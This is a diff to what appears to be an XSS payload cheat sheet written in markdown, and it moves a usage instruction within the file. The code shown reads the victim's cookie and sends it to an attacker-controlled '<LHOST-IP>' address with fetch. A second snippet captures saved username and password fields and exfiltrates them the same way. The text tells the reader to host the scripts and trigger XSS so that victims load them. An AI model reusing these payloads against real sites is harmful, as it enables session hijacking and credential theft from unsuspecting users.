@@ -13,9 +13,6 @@ let encodedCookie = encodeURIComponent(cookie)
 fetch("http://<LHOST-IP>/exfil?data=" + encodedCookie)
 ```
 
-This code can be hosted in a file called xss.js or something, and just try and have the victim reach the page to trigger it and send you a cookie!
-
-
 Steal Saved Passwords:
 
 ```js
@@ -35,3 +32,5 @@ setTimeout(function(){
 fetch("http://<LHOST-IP>/k?u=" + u.value + "&p=" + p.value)
 }, 5000);
 ```
+
+Host these files as a .js file, and try to trigger XSS to have the victim reach out and load the js.
